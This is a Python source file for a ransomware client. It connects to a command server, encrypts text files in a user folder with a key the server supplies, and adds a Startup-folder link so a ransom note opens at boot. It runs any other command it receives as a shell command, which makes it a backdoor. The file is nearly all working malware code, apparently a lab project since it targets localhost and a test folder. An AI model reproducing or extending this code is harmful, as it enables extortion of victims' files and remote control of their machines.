alotimport socket
import subprocess
import shutil
import os
from Encrypt import encrypt_file
import getpass
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
from Note import show_ransom_note
from Decrypt import decrypt_file
from uuid import getnode as get_mac
import pickle
import io

def utf8_to_bytes(string):
    # Convert UTF-8 string to bytes
    byte_stream = io.BytesIO()
    byte_stream.write(string.encode('utf-8'))
    return byte_stream.getvalue()
#def schedule_task(file_to_open = 'RANSOM_NOTE.txt'):
#    task = schedutil.Task(name='OpenFileAtStartup', action=file_to_open, trigger_type='AtStartup')
#    sched = schedutil.Scheduler()
#    sched.add_task(task)

def schedule_task(file_to_open='RANSOM_NOTE.txt'):
    # Create symlink in Windows Startup folder to open file at boot
    file_path = os.path.join(os.getcwd(), file_to_open)
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

    shortcut_path = os.path.join(startup_folder, file_path + '.lnk')
    try:
        os.symlink(file_path, shortcut_path)
    except:
        pass
    

def remove_schedule_task(file_to_open='RANSOM_NOTE.txt'):
    # Remove symlink from Windows Startup folder
    file_path = os.path.join(os.getcwd(), file_to_open)
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    shortcut_path = os.path.join(startup_folder, file_path + '.lnk')
    try:
        os.remove(shortcut_path)
    except:
        pass

#def remove_schedule_task(task_name = 'OpenFileAtStartup'):
#    sched = schedutil.Scheduler()
#    sched.remove_task(task_name)


def encrypt_files(directory_path, file_extensions, public_key):
    # Encrypt all files with specified extensions in directory
    for ext in file_extensions:
        for root, _, files in os.walk(directory_path):
            for filename in files:
                if filename.endswith(ext):
                    file_path = os.path.join(root, filename)
                    encrypt_file(file_path, public_key)

def decrypt_files(directory_path, private_key):
    # Decrypt all files with '.lolo' extension in directory
    for root, _, files in os.walk(directory_path):
        for filename in files:
            if filename.endswith('lolo'):
                file_path = os.path.join(root, filename)
                decrypt_file(file_path, private_key)

def execute_command(command, client):
    # Execute commands received from server (encrypt, decrypt, get mac, help, cd, or shell commands)
    try:
        if command == 'encrypt':
            directory = 'C://Users//' + getpass.getuser() + '//Desktop//test'
            ext = ['txt',]
            public_key = client.recv(1024).decode('utf-8')
            public_key = serialization.load_pem_public_key(utf8_to_bytes(public_key), backend=default_backend())
            encrypt_files(directory, ext, public_key)
            schedule_task()
            show_ransom_note()
            return 'Encryption complete'
        
        if command == 'get mac':
            return str(get_mac())
        
        if command == 'decrypt':
            directory = 'C://Users//' + getpass.getuser() + '//Desktop//test'
            private_key = client.recv(2056).decode('utf-8')
            private_key = serialization.load_pem_private_key(utf8_to_bytes(private_key), password=None, backend=default_backend())
            decrypt_files(directory, private_key)
            #remove_schedule_task()
            return 'Decryption complete'
        
        if command == 'help':
            return '''
            encrypt - encrypt files
            decrypt - decrypt files
            get mac - get mac address
            '''
        
        if not command.startswith("cd "):
            return subprocess.check_output(
                command,
                shell=True,
                stderr=subprocess.STDOUT,
                universal_newlines=True,
            )
        # Handle the cd command separately
        new_directory = command[3:]
        os.chdir(new_directory)
        return f'Changed directory to {new_directory}'
    except subprocess.CalledProcessError as e:
        return str(e)




def main():
    # Connect to server and execute commands in loop
    host = '127.0.0.1'
    port = 12345

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))

    while True:
        command = client.recv(1024).decode('utf-8')
        if command.lower() == "exit":
            break

        result = execute_command(command, client)
        client.send(result.encode('utf-8'))

    client.close()

if __name__ == '__main__':
    main()
